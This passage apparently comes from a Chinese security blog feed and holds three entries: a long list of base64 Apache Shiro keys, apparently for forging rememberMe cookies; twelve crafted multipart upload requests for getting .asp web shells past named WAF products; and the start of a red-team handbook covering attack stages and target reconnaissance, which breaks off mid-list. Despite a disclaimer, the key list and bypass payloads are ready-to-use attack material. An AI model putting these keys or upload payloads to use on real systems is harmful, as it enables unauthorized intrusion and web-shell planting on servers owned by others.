fOOg&#x3D;&#x3D;<br>l6NgJ0Cx3EQypphGotpi5g&#x3D;&#x3D;<br>l8UXW+AoYklIH7we3bAXIg&#x3D;&#x3D;<br>l8gw&#x2F;I0XGAljwxThcoc4xw&#x3D;&#x3D;<br>lAOnKOpdoUY1UNhmfTPGdw&#x3D;&#x3D;<br>lKAvKzqZizqW6NIKXznH6A&#x3D;&#x3D;<br>lOwFgM&#x2F;dqZXXBxaqaby7sQ&#x3D;&#x3D;<br>ld&#x2F;TklCGmgoKjASiaZO4Vg&#x3D;&#x3D;<br>lpqAaZD3J+4O&#x2F;qFz4OmPrA&#x3D;&#x3D;<br>ltOUZ4rRGyU5N+NOgSj41g&#x3D;&#x3D;<br>m05ZZ9L4jjQXn7MREpb7AA&#x3D;&#x3D;<br>m8QW9x8efj+drr+BlCcz9A&#x3D;&#x3D;<br>mLA5w3x7Snh+IpB93uhEUw&#x3D;&#x3D;<br>mRfrdiNj7616ZfHZ1GGgzw&#x3D;&#x3D;<br>mSfK3eJLpnu10P4EJCOptg&#x3D;&#x3D;<br>mXFxXYeWJk9VlusBnG4O8Q&#x3D;&#x3D;<br>mY7wtxGTzm45WjekUJ&#x2F;8jA&#x3D;&#x3D;<br>mZF&#x2F;GuHb8Ru01c4AqhcUKA&#x3D;&#x3D;<br>mbPOU6Bicp+qfM40ZtCtew&#x3D;&#x3D;<br>mkdlTv+aEXnrrn9aF8djwQ&#x3D;&#x3D;<br>mt1dfvEhxJ5iCG0XAKwXtw&#x3D;&#x3D;<br>mwTvS9wftMmeo&#x2F;VCLhhD7Q&#x3D;&#x3D;<br>n&#x2F;H&#x2F;9WotS&#x2F;XT7xCChs2WLQ&#x3D;&#x3D;<br>n8T5hZWHAj1K8XTbt4qbNQ&#x3D;&#x3D;<br>nP3VFneEItDmYUwme2842Q&#x3D;&#x3D;<br>nYlUKrxAB6geGRVWkxMOSw&#x3D;&#x3D;<br>nfvFo4PjKBkLiTEpo3APHw&#x3D;&#x3D;<br>nixWQpJdDKLAxpEwjlmFiQ&#x3D;&#x3D;<br>nlBYYjIH6ROTrOo8bUaSjw&#x3D;&#x3D;<br>nlDRTKndpcIXZD&#x2F;+ZnSbWQ&#x3D;&#x3D;<br>nx12iAW12CkB4R&#x2F;KsijG2A&#x3D;&#x3D;<br>nxfo1oYcJCo1knGwEiFMWg&#x3D;&#x3D;<br>o+x6Hu8oT3P+&#x2F;v0wrLM2Qw&#x3D;&#x3D;<br>o0JRyHDliwkfVGLlBBFXZg&#x3D;&#x3D;<br>oGAJj5ptvxn+fePc7p12Rw&#x3D;&#x3D;<br>oOb9pJBSAdWN7lhifj3sLQ&#x3D;&#x3D;<br>oPYfpwZrE5YZqV7kQtDaGw&#x3D;&#x3D;<br>oPgANeWJACdwQd4NJ1zHKw&#x3D;&#x3D;<br>oT4m6z+gd+Qj0ZBz1RZ5qg&#x3D;&#x3D;<br>oX&#x2F;XTCGgj2bIVBr4TEwzEg&#x3D;&#x3D;<br>ob7j+RFt0AYRlj80VVdRyg&#x3D;&#x3D;<br>odfMvPFeBz8CkTGcrIvdFg&#x3D;&#x3D;<br>oeOAqlwsz7YGh&#x2F;IqqhQ+Jw&#x3D;&#x3D;<br>oektKzqtSu8kpqcsS2Sg4g&#x3D;&#x3D;<br>ofjz4Ln&#x2F;Wl7FuMC9Vg19mA&#x3D;&#x3D;<br>ok14FnCz9IltBii+BiXveg&#x3D;&#x3D;<br>ok8wssACq+UGPk78xx69fA&#x3D;&#x3D;<br>osJ0HzCBt5&#x2F;Y0umy+9Qqaw&#x3D;&#x3D;<br>otifL&#x2F;3x7EznbJPnyZ+ECQ&#x3D;&#x3D;<br>ouaD8k&#x2F;vPrj3ciMATK+2&#x2F;w&#x3D;&#x3D;<br>oy8ELUj&#x2F;VgzlCNdWf3h&#x2F;&#x2F;Q&#x3D;&#x3D;<br>p3dp8ojPX4R0GRMVeSAd4Q&#x3D;&#x3D;<br>p5BESMRL9wyZ1oj7B6geHg&#x3D;&#x3D;<br>p6bIYZCynq7cXFFrdGAl1Q&#x3D;&#x3D;<br>p7NcX6q0slluQCAWEGdwVQ&#x3D;&#x3D;<br>pKLt7P9oogEfSc77KEQoZQ&#x3D;&#x3D;<br>pLed3YBRRIhitK3C8+PxHA&#x3D;&#x3D;<br>pSj0ujKIu9rqWE6KiqkXwQ&#x3D;&#x3D;<br>pSnUw0ykd+COIvsJGFq3rg&#x3D;&#x3D;<br>paVp5kn5aOLQwNXf4XIBjQ&#x3D;&#x3D;<br>pcJOpNekDJEtXIFb7TeU8g&#x3D;&#x3D;<br>phDoODMycFSFCdBTTmDxNQ&#x3D;&#x3D;<br>pnAyV1S2EggTG1uJqbGomw&#x3D;&#x3D;<br>prx0GOkoatLNrtYIbfoPxQ&#x3D;&#x3D;<br>psEX&#x2F;kWfxE0INGre8QDHDw&#x3D;&#x3D;<br>pvXSm7Eh4i0LqULmcFyUhw&#x3D;&#x3D;<br>q4rYOgVnG2Qi+yYQZgprew&#x3D;&#x3D;<br>qIhbwUpNl6YUe+gjPP&#x2F;NEg&#x3D;&#x3D;<br>qJnaEQtpTumShsoEBPTS&#x2F;w&#x3D;&#x3D;<br>qKfduuy+f7TW8BnOJuZeHw&#x3D;&#x3D;<br>qMEzyGxs6PcHCe16m+DZKA&#x3D;&#x3D;<br>qMQfy3WOiHLyYkzcXpNsLA&#x3D;&#x3D;<br>qPr9FPiu5Vu+6soaD2W9Rw&#x3D;&#x3D;<br>qTxK2Riqb0nIq02mZ30Y2A&#x3D;&#x3D;<br>qUbzSwjhBfAWpOiOugYe5w&#x3D;&#x3D;<br>qajDHDT91DFjQvf+vZR7Kw&#x3D;&#x3D;<br>qvi4m0lRfl0Zizk5ip1r5A&#x3D;&#x3D;<br>r20flUTNuoVqV3fnJsMUwg&#x3D;&#x3D;<br>r89fpQXp13fmF4kzUfDuoA&#x3D;&#x3D;<br>r8eg47skSEyfA2btmErRQQ&#x3D;&#x3D;<br>rD03BQk2kdBkqqNNL+HWVA&#x3D;&#x3D;<br>rDzITdJ0ayTaG3S1pulFxQ&#x3D;&#x3D;<br>rE7cQLcfrjoHVUhU31kALw&#x3D;&#x3D;<br>rEXZ5oHbZOKgs2MBJdTkEA&#x3D;&#x3D;<br>rFLib6x+ktTecvkpxt6OFg&#x3D;&#x3D;<br>rGbM1vT+zLmRqThyn&#x2F;VIwQ&#x3D;&#x3D;<br>rMe6KnHoN&#x2F;7M1YE&#x2F;EPRhhQ&#x3D;&#x3D;<br>rOR&#x2F;3TpLLCVwLC7l07r90Q&#x3D;&#x3D;<br>rOvHadwM8KttfSOi&#x2F;q1Pvw&#x3D;&#x3D;<br>rQQKRPVmmpIQ8cljFPHIYQ&#x3D;&#x3D;<br>rQc3dKkwP45hAb2pXHnM&#x2F;A&#x3D;&#x3D;<br>rVeaKPC&#x2F;&#x2F;gvovFD1If4nHg&#x3D;&#x3D;<br>rVnuqPTlXkEtQR0CsdxV9w&#x3D;&#x3D;<br>rXLUcoImJP8RBgP8L64uGQ&#x3D;&#x3D;<br>ra&#x2F;xC+nrOTuI&#x2F;vPdLYfpGQ&#x3D;&#x3D;<br>ran5rq7YzA6hG7wQTZsP6Q&#x3D;&#x3D;<br>rcuaIKtKMQbZh9O+LQ0y9A&#x3D;&#x3D;<br>rdHI8JgsiklSqDiHj6FTPg&#x3D;&#x3D;<br>rdOa2Brixuhnc+K2+lcNFw&#x3D;&#x3D;<br>ri7bl4Q32mnFLX4HyqJyYQ&#x3D;&#x3D;<br>rvovJeBXWeI4ohSPNnfzjw&#x3D;&#x3D;<br>s&#x2F;wTft5+uSaONMF3vnlZkw&#x3D;&#x3D;<br>s2mFzuS3Cw985oS++umoGQ&#x3D;&#x3D;<br>s9h9uiscldRNfCNy672Xfg&#x3D;&#x3D;<br>sAcbMSdf2dz4hBtz+uKGsg&#x3D;&#x3D;<br>sBCqEOwraWJEHpOJjWPU4w&#x3D;&#x3D;<br>sBZ+y0i5UfLmLwf5EjXHlg&#x3D;&#x3D;<br>sFTAHkio5ljbhBxWWiDh+Q&#x3D;&#x3D;<br>sGhc4rkEcYumNA8WahqwJg&#x3D;&#x3D;<br>sIfaz3uuv&#x2F;KpmCp70W&#x2F;gwQ&#x3D;&#x3D;<br>sNr3NaS3o58cvxyL6tC5WA&#x3D;&#x3D;<br>sZ6glnU252P46aeK1qEQog&#x3D;&#x3D;<br>sdodasF2xI446mVp5UIM2A&#x3D;&#x3D;<br>sfXaK7Slf0qPeQNEi7jK8Q&#x3D;&#x3D;<br>siHt7SxnHhaI86OIrArMwA&#x3D;&#x3D;<br>slnGASPnV2E1ZDCU8Yrd0Q&#x3D;&#x3D;<br>srNnRz3w7RBWKCU&#x2F;zjTmYw&#x3D;&#x3D;<br>sy05dMAiiJtLfoCo29xjrg&#x3D;&#x3D;<br>t41dczuACfHuZK1tckv&#x2F;5Q&#x3D;&#x3D;<br>t50cFSIgZ9c&#x2F;86OCrZ8X7w&#x3D;&#x3D;<br>tDxnIAIcal1pg0ajWxI56A&#x3D;&#x3D;<br>tEOJKNEX+Q&#x2F;FthUWNLwxOw&#x3D;&#x3D;<br>tFHEWD1iAftKlAO+h7FrWA&#x3D;&#x3D;<br>tQa31QsLrMT3gp3EjMu4Vw&#x3D;&#x3D;<br>tTDwW0Tn4cQQcp8Qu23ZTQ&#x3D;&#x3D;<br>tVWukoRTPhoMyRHJ0Verfw&#x3D;&#x3D;<br>tW0NnDW8fP83y5Q5HMr6ew&#x3D;&#x3D;<br>tXdQr43&#x2F;fZpfP3LT0dWgIQ&#x3D;&#x3D;<br>tfYteaCxNqGoDe5WGPKHBQ&#x3D;&#x3D;<br>tiNQp1lwJCnEvU4CsZoDjw&#x3D;&#x3D;<br>tpXDa3rd1T8Is3Esk6774A&#x3D;&#x3D;<br>tuPBaCh7xvo&#x2F;aaqL3dbw6g&#x3D;&#x3D;<br>u6jFX&#x2F;puCoaWgj605jG2Aw&#x3D;&#x3D;<br>uA&#x2F;LpLw5VGa5ZAOYlKqFYg&#x3D;&#x3D;<br>uEqDzVoHwFd6bOmWF5mfkA&#x3D;&#x3D;<br>uHDj&#x2F;ApSuPah0ATdmFtneQ&#x3D;&#x3D;<br>uQq7qzqMdTkReRclk&#x2F;vg3w&#x3D;&#x3D;<br>uXCDAhHvZ2Xi2JrMQPHz0w&#x3D;&#x3D;<br>ueLnhDgNYs0l6CNY2ie0HA&#x3D;&#x3D;<br>uiZDeD9f999GmetIA4wspw&#x3D;&#x3D;<br>uizChCzf7D4gHr7cYhJysg&#x3D;&#x3D;<br>uppV9kZeD8kihlYY+VAGCQ&#x3D;&#x3D;<br>uvZe+X2+GyV&#x2F;zzgVdNOUyw&#x3D;&#x3D;<br>v4M2sMhcxz5zXpWst9LxDg&#x3D;&#x3D;<br>v4nkwWOqi6gO4pTD1kwdXg&#x3D;&#x3D;<br>v6J1Z6oJcUCCJeg&#x2F;U7q4qA&#x3D;&#x3D;<br>v9hbbr19KYfwYMODGS4fVQ&#x3D;&#x3D;<br>vIFcqWLpL5sZN0NKuRRLcA&#x3D;&#x3D;<br>vKjf7jtnLVzKlpiEBj6g6g&#x3D;&#x3D;<br>vY2CPWf08YvTlxHZHxJB5g&#x3D;&#x3D;<br>vYFLuRvchlgmo3fWMEAVOA&#x3D;&#x3D;<br>vzKf4la46A+sdpblFEn60A&#x3D;&#x3D;<br>w2vMYewyr+KXmNlv39XEEQ&#x3D;&#x3D;<br>wH1KOSuiv7Kn6GeNVZ9+7w&#x3D;&#x3D;<br>wMa+wwDpXgJwyjrqQGre5Q&#x3D;&#x3D;<br>wRTQp0M40hcUq6p22x6DNQ&#x3D;&#x3D;<br>wY5M5k&#x2F;cJ5cd8Scms+Ivvw&#x3D;&#x3D;<br>wgMkUJ0+IHKwc163fwW6WQ&#x3D;&#x3D;<br>wpKnsDvV7zzReQSmY05Jfw&#x3D;&#x3D;<br>wyY0puJrynwfuBoX&#x2F;5SfXg&#x3D;&#x3D;<br>x5RT17zr46N4v32uMGoT7Q&#x3D;&#x3D;<br>x8OUddV52M1sD2iX1TgwPQ&#x3D;&#x3D;<br>xY&#x2F;Py8rrXpIaiP5DYHKHJQ&#x3D;&#x3D;<br>xaOWanZ5FMwjZLcg3OkZpg&#x3D;&#x3D;<br>xfHhfJa8H2fhxb70d4wPhg&#x3D;&#x3D;<br>xliLxYKmWp7FdJDTvR64aw&#x3D;&#x3D;<br>xvhzjL0Dz3zX0J5H6+G7mw&#x3D;&#x3D;<br>xxOUGpTHB6ZL6FcjXxNmZg&#x3D;&#x3D;<br>y+iKxEfLmoz&#x2F;46fcMdne5g&#x3D;&#x3D;<br>y+lrzDXb0bQi74d7a2YsoA&#x3D;&#x3D;<br>y9N&#x2F;A+XzRNmFhBSJMnwtew&#x3D;&#x3D;<br>yWz42JvzwNDc&#x2F;xifdSINLA&#x3D;&#x3D;<br>yg8tW9kDLR7wzoSLvPwvwg&#x3D;&#x3D;<br>ygJw7ry1XevpnCys1hOmZg&#x3D;&#x3D;<br>ykFi595&#x2F;Fl04fJ2xuBYwYw&#x3D;&#x3D;<br>yl3gvDmII9F74JQSaPUuIA&#x3D;&#x3D;<br>ypb2mLD&#x2F;Y9ZF4LlsPGRJUw&#x3D;&#x3D;<br>ys6irM6SToSvJtWOfere4Q&#x3D;&#x3D;<br>yunQrhFO8OmTyUwFz&#x2F;OCVA&#x3D;&#x3D;<br>ywM+CNdZoaXVGX9ybf9btQ&#x3D;&#x3D;<br>z4rUCB8E9U71fFOwh&#x2F;&#x2F;GjA&#x3D;&#x3D;<br>z9Pdt1YVDM+4O0qjVSMz1g&#x3D;&#x3D;<br>zC8aC11AVNa1g3rHB5p8tg&#x3D;&#x3D;<br>zFz5Hu1NTuGLNZfmmPRUuQ&#x3D;&#x3D;<br>zGB+ygayX4v8GHrp&#x2F;vYOyg&#x3D;&#x3D;<br>zGTO3faB2+62LU9ZV81b8w&#x3D;&#x3D;<br>zH+m8pQ49HUq3Ru7Oym9&#x2F;w&#x3D;&#x3D;<br>zKi5alGrBnK0lWU0rLZfrQ&#x3D;&#x3D;<br>zWbMTzTmFtUVciUE3Yo2Xg&#x3D;&#x3D;<br>zZG0cSIvFgY83wrVLVYj&#x2F;w&#x3D;&#x3D;<br>zcR8SLYBJFyOknQxqW46Hg&#x3D;&#x3D;<br>zfDkwwF9ydiIbXTMxRaHGA&#x3D;&#x3D;<br>znJ984VkEEKwW5ZbbCYd0Q&#x3D;&#x3D;<br>zx9DvPzTSauVSdn2XDWIdg&#x3D;&#x3D;<br>zy1KJFZ6eucDxK6nGW0xcQ&#x3D;&#x3D;<br>1t43gns419h1g61dpnpfe<br>7jTQxw&#x2F;&#x2F;pkbYKhiLzrhOvQ&#x3D;&#x3D;<br>a7lysQ9bWt7hclqXmJNoPg&#x3D;&#x3D;<br>bTBANVpaOUw0ampRWG43TVJFcF5iXjdJ<br>dG91dGlhbzEyMzQ1Ng&#x3D;&#x3D;<br>dG91dGlhbzEyMzQ1NQ&#x3D;&#x3D;<br>FcoRsBKe9XB3zOHbxTG0Lw&#x3D;&#x3D;<br>g2wzfqvMOeazgtsUVbq1kmJawROa6mcRAzwG1&#x2F;GeJ4&#x3D;<br>ikB3y6O9BpimrZLB3rca0w&#x3D;&#x3D;<br>k3+XHEg6D8tb2mGm7VJ3nQ&#x3D;&#x3D;<br>LafjwUgsDlNmnet47IJQWg&#x3D;&#x3D;<br>lxuEtAWbv+SgUOXREM+zrA&#x3D;&#x3D;<br>nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3<br>nwEHmyG0f66WQT7Qu6N6SQ&#x3D;&#x3D;<br>WWFuemhlbmcg5Lil5q2jAA&#x3D;&#x3D;<br>ZUdsaGJuSmxibVI2ZHc9PQ<br>ZUdSNFpIaGs&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> Shiro Key </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro Key </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass手法</title>
      <link href="/2022/06/18/bypass/"/>
      <url>/2022/06/18/bypass/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1：绕过长亭深信服waf只测试这两个<br>2：绕过安塞<br>默认状态<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破0<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”[0x09]a.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破1 去掉双引号<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;a.asp<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破2 添加一个filename1<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp”;filename1&#x3D;”test.jpg”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破3 form中间+<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Disposition: f+orm-data; name&#x3D;”filepath”;filename&#x3D;”test.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破4 大小写<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>ConTent-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破5 去掉form-data<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>ConTent-Disposition: name&#x3D;”filepath”; filename&#x3D;”a.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破6 在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格<br>[mw_shl_code&#x3D;bash,true][mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>ConTent-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code][&#x2F;mw_shl_code]</p><p>突破7 a.asp . (空格+.)<br>[mw_shl_code&#x3D;bash,true][mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>ConTent-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp .”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code][&#x2F;mw_shl_code]</p><p>突破8 “换行<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>ConTent-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp<br>“<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破9 NTFS流<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>ConTent-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”test.asp::$DATA”<br>Content-Type: text&#x2F;html</p><p>——WebKitFormBoundary2smpsxFB3D0KbA7D<br>ConTent-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”test.asp::$DATA\0x00\fuck.asp0x00.jpg”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破10 经过对IIS 6.0的测试发现，其总是采用第一个Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传test.asp成功]：<br>[mw_shl_code&#x3D;bash,true]Content-Disposition: form-data; name&#x3D;”FileUploadName”; filename&#x3D;”test.asp”</p><p>—————————–15377259221471</p><p>Content-Disposition: form-data; name&#x3D;”FileUploadName”; filename&#x3D;”test.txt”</p><p>Content-Type: application&#x2F;octet-stream</p><p>Content-Disposition: form-data; name&#x3D;”FileUploadName”; filename&#x3D;”test.asp”<br>Content-Disposition: form-data;<br>name&#x3D;”FileUploadName”; filename&#x3D;”test.asp”[&#x2F;mw_shl_code]</p><p>突破11 换位<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Type: text&#x2F;html<br>ConTent-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp”[&#x2F;mw_shl_code]</p><p>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p><p>突破12 tab<br>tab可以在“a.asp”后 也可以在前这个根据实际情况机型进行测试<br>[mw_shl_code&#x3D;bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D<br>Content-Disposition: form-data; name&#x3D;”filepath”; filename&#x3D;”a.asp”<br>Content-Type: text&#x2F;html[&#x2F;mw_shl_code]</p>]]></content>
      
      
      <categories>
          
          <category> bypass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>真不是红队(盗引呼吸法创作者by盗引)</title>
      <link href="/2022/06/18/%E7%9C%9F%E4%B8%8D%E6%98%AF%E7%BA%A2%E9%98%9F/"/>
      <url>/2022/06/18/%E7%9C%9F%E4%B8%8D%E6%98%AF%E7%BA%A2%E9%98%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="红方人员实战手册"><a href="#红方人员实战手册" class="headerlink" title="红方人员实战手册"></a>红方人员实战手册</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Author : By 盗引呼吸法</span><br><span class="line">Date   : 2022.6.16</span><br><span class="line">寄语    : 愿 2022 后面的每一天都能一切安好</span><br></pre></td></tr></table></figure><h3 id="分享初衷"><a href="#分享初衷" class="headerlink" title="分享初衷"></a>分享初衷</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一来, 旨在为 &quot;攻击&quot; / &quot;防御&quot;方 提供更加全面实用的参考</span><br><span class="line">还是那句老闲话 &quot;未知攻焉知防&quot;, 所有单纯去说 &quot;攻&quot; 或者 &quot;防&quot; 的都是耍流氓, 攻守兼备才能把路越走越宽</span><br><span class="line"></span><br><span class="line">二来, 也是为秉承共享协作, 希望能为 红队 及 部分实战攻防研究人员 做出自己应有的贡献</span><br><span class="line">个人一直坚信, 真正的价值来源于实实在在的奉献,与其天天到处嘴炮,不如静下心来多反思下自己,好好踏踏实实做些对大家都有益的事</span><br></pre></td></tr></table></figure><h3 id="丑话说在前面"><a href="#丑话说在前面" class="headerlink" title="丑话说在前面"></a>丑话说在前面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">严禁任何 个人/组织机构 利用以下相关技术去从事任何未经合法授权的 网络入侵攻击破坏或者黑产活动</span><br><span class="line">严禁任何 个人/组织机构 以此来进行任何形式的 商业牟利 或 恶意炒作行为,包括各类非法渗透培训,误人子弟的负面恶意引导等....</span><br><span class="line">严禁一切的恶意传播及非法利用,由此所产生的一切恶果也均由读者自行承担</span><br></pre></td></tr></table></figure><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">以下仅针对日常 &quot;红队&quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总</span><br><span class="line">针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)</span><br><span class="line">由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的</span><br><span class="line">而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动</span><br><span class="line">这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战</span><br><span class="line">所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的</span><br><span class="line">需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用</span><br><span class="line">由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同</span><br><span class="line">所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善</span><br><span class="line">个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的</span><br><span class="line">稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态</span><br><span class="line">尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人</span><br><span class="line">所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的</span><br><span class="line">虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色</span><br><span class="line">说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本</span><br><span class="line">另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心</span><br></pre></td></tr></table></figure><h3 id="日常流程简要说明"><a href="#日常流程简要说明" class="headerlink" title="日常流程简要说明"></a>日常流程简要说明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</span><br></pre></td></tr></table></figure><h3 id="0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心"><a href="#0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心" class="headerlink" title="0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]"></a>0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">绕CDN找出目标所有真实ip段</span><br><span class="line">找目标的各种Web管理后台登录口</span><br><span class="line">批量抓取目标所有真实C段 Web banner</span><br><span class="line">批量对目标所有真实C段 进行基础服务端口扫描探测识别</span><br><span class="line">尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破</span><br><span class="line">批量抓取目标所有子域 Web banner</span><br><span class="line">批量对目标所有子域集中进行基础服务端口探测识别</span><br><span class="line">批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本</span><br><span class="line">从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &quot;AccessKey&quot;</span><br><span class="line">从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码</span><br><span class="line">从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]</span><br><span class="line">目标Svn里泄露的各类 敏感文件</span><br><span class="line">网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]</span><br><span class="line">目标站点自身在前端代码中泄露的各种敏感信息</span><br><span class="line">fofa / shodan / bing / google  hacking 深度利用</span><br><span class="line">搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 